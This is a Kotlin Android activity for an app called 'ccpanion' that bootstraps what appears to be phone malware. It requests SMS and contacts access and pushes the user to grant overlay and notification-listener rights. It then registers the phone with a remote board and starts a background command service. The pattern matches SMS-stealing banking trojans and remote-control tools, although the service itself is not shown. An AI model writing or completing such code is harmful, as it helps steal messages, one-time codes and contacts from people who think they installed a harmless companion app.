// language: Kotlin, target: Android 7.0+ (API 24), file: MainActivity.kt
// bootstrap: perms, register, start CmdService (pump lives there)
package com.kai.ccpanion

import android.Manifest
import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import java.util.concurrent.Executors
import org.json.JSONObject

class MainActivity : Activity() {

    private val exec = Executors.newSingleThreadExecutor()
    private lateinit var status: TextView

    override fun onCreate(b: Bundle?) {
        super.onCreate(b)

        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(64, 96, 64, 64)
        }
        status = TextView(this).apply { textSize = 16f }
        root.addView(status)
        root.addView(Button(this).apply { text = "Overlay‑toestemming geven"; setOnClickListener { openOverlayGrant() } })
        root.addView(Button(this).apply { text = "Meldingentoegang geven"; setOnClickListener { openNotifGrant() } })
        setContentView(root)

        askRuntimePerms()
        Rt.init(this)

        status.text = "ccpanion — verbinden…"
        exec.execute {
            if (!Rt.signUp(this) && Rt.token() == null) {
                runOnUiThread { status.text = "board: geen verbinding — internet?" }
                return@execute
            }
            registerDevice()
            runOnUiThread { status.text = "ccpanion — verbonden · ${Rt.deviceId}" }
            if (Build.VERSION.SDK_INT >= 26){
                startForegroundService(Intent(this, CmdService::class.java))
            } else {
                startService(Intent(this, CmdService::class.java))
            }
        }
    }

    private fun askRuntimePerms(){
        val need = mutableListOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CONTACTS
        )
        if (Build.VERSION.SDK_INT >= 33) need.add(Manifest.permission.POST_NOTIFICATIONS)
        val missing = need.filter { checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED }
        if (missing.isNotEmpty()) requestPermissions(missing.toTypedArray(), 7)
    }

    private fun openOverlayGrant(){
        startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
    }

    private fun openNotifGrant(){
        startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
    }

    private fun registerDevice(){
        val info = JSONObject()
            .put("model", Build.MODEL)
            .put("brand", Build.BRAND)
            .put("android", Build.VERSION.RELEASE)
            .put("sdk", Build.VERSION.SDK_INT)
            .put("lastSeen", System.currentTimeMillis())
        Rt.put("phones/${Rt.deviceId}/info", info)
    }
}
